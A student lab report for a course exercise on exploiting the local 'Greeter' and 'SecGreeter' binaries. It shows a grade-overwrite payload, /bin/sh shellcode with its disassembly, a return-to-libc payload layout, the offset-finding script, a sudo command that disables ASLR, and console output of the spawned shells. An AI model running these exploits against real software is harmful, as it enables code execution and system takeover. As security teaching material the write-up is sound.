# Lab Report: Buffer overflow exploitation

**Authors:**  
Michalis Lamprakis - 2020030077  
Christos Dimas     - 2021030183

This `README.md` serves as a lab report for the 8th exercise, explaining the code implementation of two exploits, a simple buffer overflow and a return-to-libc.

---
### Implementation: Part 1 - Buffer Overflow Attack
#### Grade modification
In order to modify our grade we observe the placement of Grade variable and its distance in memory with buf variable, using gdb. In this way we know that if we place 'A' 32 times we reach the place that Grade is written and then we can insert our prefered value.

So the payload is: 

```bash
python3 -c "print('A' * 32 + '\x09')" | ./Greeter
```

Why not 10?

We can not make our Grade 10 because the representation of decimal 10 in the ascii table is the newline character, which triggers `gets()` and forces it to stop the reading process.

#### Spawn a terminal shell

In order to spawn a terminal shell we need to overwrite the `$eip` register:

                |/////////////|
        ESP ->  |-------------|
                |             |
                |             |
                |  FUNCTION   |
                |  VARIABLES  |
                |             |
                |             |
                |             |
                |             |
        EBP ->  |-------------|
                |  STORED EBP |
                |-------------|
                |     EIP     |
                |-------------|
                |/////////////|

To find exactly how much characters we need to insert in order to overwrite the `$eip`, we use `cyclic()`and `cyclic_find()` from `pwn` python library  to generate an input, feed it to the executable, observe the point that segmentation fault appears and finally get the offset (OFFSET = 52).

After that, we know that the global variable "Name" resides in some area of memory that is marked as rwx (using mprotect), so it makes sense that we overwrite `$eip` with Name's address. To find that address we used gdb to set a breakpoint in printf and then `p &Name` command, which helps as find what we need (RETURN ADDRESS = 0x80e6ca0).

Examining the source code, we see that the first 128 bytes of the buf variable are copied into the Name buffer, so our payload should be the first thing we write into the buffer so that it gets copied into the executable segment.


**Payload:**

We used the following shellcode: http://shell-storm.org/shellcode/files/shellcode-811.php.
It pushes the string "/bin/sh" onto the stack and then calls the execve syscall to execute a shell.


```c
        08048060 <_start>:
        8048060: 31 c0                 xor    eax, eax          eax <- 0
        8048062: 50                    push   eax               push 0
        8048063: 68 2f 2f 73 68        push   0x68732f2f        push "//sh"     
        8048068: 68 2f 62 69 6e        push   0x6e69622f        push "/bin"
        804806d: 89 e3                 mov    ebx, esp          ebx <- esp
        804806f: 89 c1                 mov    ecx, eax          ecx <- 0
        8048071: 89 c2                 mov    edx, eax          edx <- 0
        8048073: b0 0b                 mov    al, 0xb           eax <- 11
        8048075: cd 80                 int    0x80              syscall (execve("/bin/sh", 0, 0))
        8048077: 31 c0                 xor    eax, eax          eax <- 0
        8048079: 40                    inc    eax               eax <- 1
        804807a: cd 80                 int    0x80              syscall (exit())
```

Shellcode length: 28 bytes

Since the shellcode is part of the offset to reach `$eip`, the correct padding after we write our payload is `Padding bytes = OFFSET - shellcode length`.

Finally the exploit is:

`Payload = shellcode + 'A'*Padding bytes + RETURN ADDRESS + newline`, we use newline to trigger gets() immediately.

To implement all the previously mentioned functionality, we built a python script that creates the payload saves it to a file `exploit` and with the help of `pwn` library execute `./Greeter` program and feeds it the payload as input.

Note: The suggested way to run and avoid issues with pipe and bad characters in input is the one that we show below.

So in order to see the solution:
```bash
# Enter python's virtual enviroment
source venv/bin/activate

# Run script and get the result
python3 payload_generator.py
```
And the result in the console:
```bash
[+] Starting local process './Greeter': pid 1013338
[*] Switching to interactive mode
What is your name?
Hello 1\xc0Ph//shh/bin\x89\xe3\x89\xc1\x89°\x0b̀1\xc0@̀AAAAAAAA$, your grade is 1094795585. Have a nice day.
$ cd /
$ ls
bin		   etc		      lib64	  opt	sbin.usr-is-merged  tmp
bin.usr-is-merged  home		      libx32	  proc	snap		    usr
boot		   lib		      lost+found  root	srv		    var
cdrom		   lib.usr-is-merged  media	  run	swap.img
dev		   lib32	      mnt	  sbin	sys
$ exit
[*] Got EOF while reading in interactive
```


---

### Implementation: Part 2 - Return-to-libc Attack

This task is about completing a return-to-libc attack in a more secure program that does not allow stack execution `SecGreeter`.

To complete this task, we created a new python script to construct the payload, by doing the following steps:

1) We repeated the procedure that was made before for the offset calculation (OFFSET = 44)
2) Then we used once more gdb in order to find the base address of libc, with command : `info proc mapping` after setting a breakpoint in printf (LIBC ADDRESS = 0xf7d76000)
3) We calculated the offsets of `system()`, `exit()` and "bin/sh" from the base address using python in our script

So now to achieve this attack we need to redirect our program to run the `system("/bin/sh")` function and then ensure that after system returns the program will terminate peacefully. This is going to be achieved by the way sawn in the visual representation of Stack below:

```
                |/////////////|                 
        ESP ->  |-------------|                 
                |             |              
                |             |                       
                |   BUFFER    |                       
                |             |                                    
        EBP ->  |-------------|     
                |   BUFFER    |       
        EIP ->  |-------------|                   
                |   system    |
                |   address   |                    
                |-------------|                       
                |    exit     |
                |   address   |      <-- 2nd Execution                  
                |-------------|                  
                |   /bin/sh   |
                |   address   |      <-- 1st Execution                
                |-------------|                       
                |/////////////|                  
```

This will work because arguments are pushed onto the stack in reverse order so after the redirect, `/bin/sh` is going to be taken as the function's argument and be executed and then `exit()`.

So, `Payload = 'A'*44 + system address + exit address + /bin/sh address`.

To implement all the previously mentioned functionality, the python script creates the payload saves it to a file `exploitV2` and with the help of `pwn` library execute `./SecGreeter` program and feeds it the payload as input.

Note: The suggested way to run and avoid issues with pipe and bad characters in input is the one that we show below.

So in order to see the solution:

```bash

# Enter python's virtual enviroment
source venv/bin/activate

# Disable ASLR
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Run script and get the result
python3 payload_generator_v2.py
```

And the result in the console:
```bash
[+] Starting local process './SecGreeter': pid 859903
[*] Switching to interactive mode
What is your name?
$ cd /
$ ls
bin		   etc	  lib.usr-is-merged  opt   sbin.usr-is-merged  tmp
bin.usr-is-merged  home   libx32	     proc  snap		       usr
boot		   lib	  lost+found	     root  srv		       var
cdrom		   lib32  media		     run   swap.img
dev		   lib64  mnt		     sbin  sys
$ exit
[*] Got EOF while reading in interactive

```
### Additional

1. There was created a program written in C programming language `test_shellcode.c`, so we can test our shellcode. To compile it and test your shellcode change the variable `const char shellcode[]` with yours and use the following command.

```bash
gcc -fno-stack-protector -z execstack -m32 -o shellcode_test shellcode_test.c
```

2. The script used to calculate the offsets
```python
from pwn import cyclic, cyclic_find

# Generate a cyclic pattern to give as input to the program
print(cyclic(132))

# Replace with the EIP value you noted
eip_value = 0x6161616c
offset = cyclic_find(eip_value.to_bytes(4, byteorder='little'))  # Convert to bytes
print(f"Offset: {offset}")
```